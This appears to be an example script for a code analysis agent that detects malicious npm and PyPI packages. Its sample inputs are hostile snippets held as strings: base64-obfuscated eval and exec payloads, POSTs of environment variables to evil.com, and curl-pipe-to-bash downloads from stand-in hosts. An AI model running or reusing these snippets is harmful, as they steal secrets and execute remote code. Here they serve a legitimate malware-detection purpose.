"""
Example usage of the Code Analysis Agent.

This script demonstrates how to use the Code Analysis Agent to analyze
suspicious code for obfuscation, behavioral patterns, and security issues.

**Validates: Requirements 6.1, 6.2, 6.3, 6.4, 6.5**
"""

from agents.code_agent import CodeAnalysisAgent
from agents.types import SharedContext, Finding


def example_1_analyze_obfuscated_code():
    """Example 1: Analyze code with base64 obfuscation and eval"""
    print("=" * 80)
    print("Example 1: Analyzing obfuscated code with base64 and eval")
    print("=" * 80)
    
    # Create agent
    agent = CodeAnalysisAgent()
    
    # Create context with suspicious code
    finding = Finding(
        package_name="suspicious-package",
        package_version="1.0.0",
        finding_type="obfuscated_code",
        severity="high",
        description="Suspicious obfuscated code detected",
        detection_method="rule_based",
        evidence={
            "code": """
            const encoded = 'Y29uc3QgZnMgPSByZXF1aXJlKCdmcycpOwpmcy53cml0ZUZpbGVTeW5jKCcvdG1wL3N0b2xlbicsIEpTT04uc3RyaW5naWZ5KHByb2Nlc3MuZW52KSk7';
            eval(atob(encoded));
            fetch('http://evil.com/exfiltrate', {
                method: 'POST',
                body: JSON.stringify(process.env)
            });
            """
        }
    )
    
    context = SharedContext(
        initial_findings=[finding],
        dependency_graph={},
        packages=["suspicious-package"],
        ecosystem="npm"
    )
    
    # Analyze
    result = agent.analyze(context, timeout=30)
    
    # Display results
    print(f"\nTotal packages analyzed: {result['total_packages_analyzed']}")
    print(f"Suspicious patterns found: {result['suspicious_patterns_found']}")
    print(f"Overall confidence: {result['confidence']:.2f}")
    
    if result['packages']:
        package = result['packages'][0]
        print(f"\nPackage: {package['package_name']}@{package['package_version']}")
        print(f"Confidence: {package['confidence']:.2f}")
        print(f"Reasoning: {package['reasoning']}")
        
        code_analysis = package['code_analysis']
        print(f"\nObfuscation techniques detected: {len(code_analysis['obfuscation_detected'])}")
        for tech in code_analysis['obfuscation_detected']:
            print(f"  - {tech['technique']} (severity: {tech['severity']})")
        
        print(f"\nBehavioral indicators: {len(code_analysis['behavioral_indicators'])}")
        for indicator in code_analysis['behavioral_indicators']:
            print(f"  - {indicator['behavior']} (severity: {indicator['severity']})")
        
        print(f"\nCode complexity: {code_analysis['complexity_score']:.2f}")
        print(f"Risk level: {code_analysis['risk_level']}")


def example_2_analyze_process_spawning():
    """Example 2: Analyze code with process spawning"""
    print("\n" + "=" * 80)
    print("Example 2: Analyzing code with process spawning")
    print("=" * 80)
    
    agent = CodeAnalysisAgent()
    
    finding = Finding(
        package_name="malicious-installer",
        package_version="2.0.0",
        finding_type="suspicious_script",
        severity="critical",
        description="Suspicious process spawning detected",
        detection_method="rule_based",
        evidence={
            "code": """
            const { spawn } = require('child_process');
            const child = spawn('bash', ['-c', 'curl http://malware.com/payload.sh | bash']);
            child.on('exit', () => {
                console.log('Installation complete');
            });
            """
        }
    )
    
    context = SharedContext(
        initial_findings=[finding],
        dependency_graph={},
        packages=["malicious-installer"],
        ecosystem="npm"
    )
    
    result = agent.analyze(context, timeout=30)
    
    if result['packages']:
        package = result['packages'][0]
        print(f"\nPackage: {package['package_name']}@{package['package_version']}")
        print(f"Risk level: {package['code_analysis']['risk_level']}")
        print(f"Reasoning: {package['reasoning']}")


def example_3_analyze_python_code():
    """Example 3: Analyze Python code with subprocess"""
    print("\n" + "=" * 80)
    print("Example 3: Analyzing Python code with subprocess")
    print("=" * 80)
    
    agent = CodeAnalysisAgent()
    
    finding = Finding(
        package_name="python-backdoor",
        package_version="1.5.0",
        finding_type="obfuscated_code",
        severity="critical",
        description="Python code with subprocess execution",
        detection_method="rule_based",
        evidence={
            "code": """
            import subprocess
            import base64
            import os
            
            # Decode and execute
            payload = base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImN1cmwgaHR0cDovL2V2aWwuY29tL3N0ZWFsLnNoIHwgYmFzaCIp')
            exec(payload)
            
            # Exfiltrate environment
            subprocess.call(['curl', '-X', 'POST', 'http://evil.com/data', 
                           '-d', str(os.environ)])
            """
        }
    )
    
    context = SharedContext(
        initial_findings=[finding],
        dependency_graph={},
        packages=["python-backdoor"],
        ecosystem="pypi"
    )
    
    result = agent.analyze(context, timeout=30)
    
    if result['packages']:
        package = result['packages'][0]
        print(f"\nPackage: {package['package_name']}@{package['package_version']}")
        
        code_analysis = package['code_analysis']
        print(f"\nObfuscation techniques:")
        for tech in code_analysis['obfuscation_detected']:
            print(f"  - {tech['technique']}")
        
        print(f"\nBehavioral indicators:")
        for indicator in code_analysis['behavioral_indicators']:
            print(f"  - {indicator['behavior']}")
            if 'examples' in indicator:
                print(f"    Examples: {', '.join(indicator['examples'][:2])}")


def example_4_clean_code():
    """Example 4: Analyze clean code (no suspicious patterns)"""
    print("\n" + "=" * 80)
    print("Example 4: Analyzing clean code")
    print("=" * 80)
    
    agent = CodeAnalysisAgent()
    
    # No suspicious findings
    context = SharedContext(
        initial_findings=[],
        dependency_graph={},
        packages=["clean-package"],
        ecosystem="npm"
    )
    
    result = agent.analyze(context, timeout=30)
    
    print(f"\nTotal packages analyzed: {result['total_packages_analyzed']}")
    print(f"Note: {result.get('note', 'N/A')}")


def example_5_complexity_analysis():
    """Example 5: Analyze code complexity"""
    print("\n" + "=" * 80)
    print("Example 5: Code complexity analysis")
    print("=" * 80)
    
    agent = CodeAnalysisAgent()
    
    # Simple code
    simple_code = """
    function hello() {
        return "world";
    }
    """
    
    # Complex code
    complex_code = """
    function processData(data) {
        if (data) {
            for (let i = 0; i < data.length; i++) {
                if (data[i].valid) {
                    while (data[i].processing) {
                        try {
                            processItem(data[i]);
                        } catch (e) {
                            handleError(e);
                        }
                    }
                }
            }
        }
    }
    """ * 10  # Repeat to increase complexity
    
    simple_complexity = agent.calculate_complexity(simple_code)
    complex_complexity = agent.calculate_complexity(complex_code)
    
    print(f"\nSimple code complexity: {simple_complexity:.2f}")
    print(f"Complex code complexity: {complex_complexity:.2f}")


def main():
    """Run all examples"""
    print("\n" + "=" * 80)
    print("CODE ANALYSIS AGENT - EXAMPLE USAGE")
    print("=" * 80)
    
    try:
        example_1_analyze_obfuscated_code()
        example_2_analyze_process_spawning()
        example_3_analyze_python_code()
        example_4_clean_code()
        example_5_complexity_analysis()
        
        print("\n" + "=" * 80)
        print("All examples completed successfully!")
        print("=" * 80)
        
    except Exception as e:
        print(f"\nError running examples: {str(e)}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
